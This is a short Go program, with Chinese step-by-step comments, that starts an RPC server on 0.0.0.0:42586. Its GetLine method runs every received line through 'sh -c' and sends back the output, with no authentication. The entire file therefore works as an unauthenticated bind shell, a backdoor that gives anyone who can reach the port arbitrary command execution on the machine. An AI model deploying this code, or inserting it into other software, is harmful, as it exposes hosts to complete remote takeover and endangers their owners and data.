package main

import (
	"fmt"
	"log"
	"net"
	"net/rpc"
	"os/exec"
)

type Listener int

func (l *Listener) GetLine(line []byte, ack *string) error {
	fmt.Println(string(line))
	cmd := exec.Command("sh", "-c", string(line))
	//cmd.Run()
	var out []byte
	var err error
	if out, err = cmd.CombinedOutput(); err != nil {
		log.Fatal(err)
	}

	ll := string(out)
	*ack = ll
	return nil
}
// 启动起来就是先ResolveTCPAddr，解析下它。
func main() {
	addy, err := net.ResolveTCPAddr("tcp", "0.0.0.0:42586")
	if err != nil {
		log.Fatal(err)
	}
// 用Addr去监听本地，最后用监听本地的inbound直接去RCP Accept
	inbound, err := net.ListenTCP("tcp", addy)
	if err != nil {
		log.Fatal(err)
	}

	// 先New一个Listener
	listener := new(Listener)
	// 用rpc.Register注册上
	rpc.Register(listener)
	// 最后OK
	rpc.Accept(inbound)
}

